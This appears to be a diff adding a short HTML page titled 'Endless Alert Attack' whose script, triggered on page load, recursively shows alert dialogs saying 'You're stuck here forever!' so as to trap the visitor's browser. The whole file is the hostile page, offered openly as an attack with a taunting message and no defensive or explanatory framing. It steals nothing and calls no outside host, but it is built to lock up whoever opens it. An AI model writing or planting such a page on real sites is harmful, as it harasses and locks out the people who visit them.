@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Endless Alert Attack</title>
+    <script>
+        function endlessAlert() {
+            alert("You're stuck here forever!");
+            endlessAlert();  // Recursively call the function to keep showing alerts.
+        }
+        window.onload = endlessAlert;  // Trigger the attack when the page loads.
+    </script>
+</head>
+<body>
+    <h1>Endless Alert Attack</h1>
+    <p>Good luck trying to close this...</p>
+</body>
+</html>
